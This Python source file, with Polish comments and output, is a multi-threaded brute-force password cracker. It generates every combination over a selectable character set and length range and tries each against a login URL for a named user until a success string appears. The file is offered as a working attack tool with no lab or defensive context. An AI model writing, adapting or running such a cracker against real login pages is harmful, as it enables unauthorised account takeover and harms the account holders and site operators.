import itertools
import string
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from src.target import try_password

def get_charset(charset_name: str):
    mapping = {
        'ascii_uppercase': string.ascii_uppercase,
        'ascii_lowercase': string.ascii_lowercase,
        'digits': string.digits,
        'ascii_letters': string.ascii_letters,
        'ascii_uppercase+digits': string.ascii_uppercase + string.digits,
        'ascii_lowercase+digits': string.ascii_lowercase + string.digits,
        'all': string.ascii_letters + string.digits + string.punctuation
    }
    return mapping.get(charset_name, charset_name)  # pozwala też na własne zestawy

def brute_force(url, username, charset, min_length, max_length, threads, success_string, fail_string):
    chars = get_charset(charset)
    print(f"Brute-force na {url} jako {username}, charset={charset}, długość={min_length}-{max_length}")

    def password_generator():
        for l in range(min_length, max_length+1):
            for pw_tuple in itertools.product(chars, repeat=l):
                yield ''.join(pw_tuple)

    def worker(pw):
        return try_password(url, username, pw, success_string, fail_string)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for pw, result in tqdm(zip(password_generator(), executor.map(worker, password_generator())), total=sum(len(chars)**l for l in range(min_length, max_length+1))):
            if result:
                print(f"\nZnalezione hasło: {pw}")
                return
    print("Nie znaleziono hasła w podanym zakresie.")
